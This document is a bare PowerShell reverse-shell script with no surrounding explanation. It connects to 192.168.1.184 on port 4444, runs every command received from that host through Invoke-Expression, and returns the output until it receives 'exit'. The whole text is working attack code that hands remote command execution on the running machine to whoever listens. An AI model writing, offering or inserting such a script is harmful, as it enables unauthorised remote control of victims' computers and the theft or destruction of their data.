$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    $command = $reader.ReadLine()
    if ($command -eq "exit") { break }
    $output = try {
        Invoke-Expression $command 2>&1 | Out-String
    } catch {
        $_.Exception.Message
    }
    $writer.WriteLine($output)
}
$client.Close()
